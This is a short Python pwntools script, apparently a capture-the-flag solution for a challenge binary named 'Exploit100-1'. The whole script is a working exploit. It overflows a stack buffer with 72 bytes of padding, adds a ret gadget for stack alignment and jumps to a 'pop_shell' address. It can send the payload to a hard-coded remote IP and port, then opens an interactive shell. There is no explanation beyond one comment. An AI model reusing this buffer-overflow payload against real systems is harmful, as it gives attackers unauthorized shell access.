#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("Exploit100-1")

gs = '''
b *vulnerable_function+118
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("35.184.182.18", 32002)
    else:
        return process(elf.path)

# Plan:

# Addresses
pop_shell = 0x401152
ret = 0x401016
# Functions

io = start()

p = b"A"*64 + b"B"*8 + p64(ret) + p64(pop_shell) # Added an extra ret for stack alignment (this was the trick)

io.sendline(b"100")
io.sendline(p)

io.interactive()
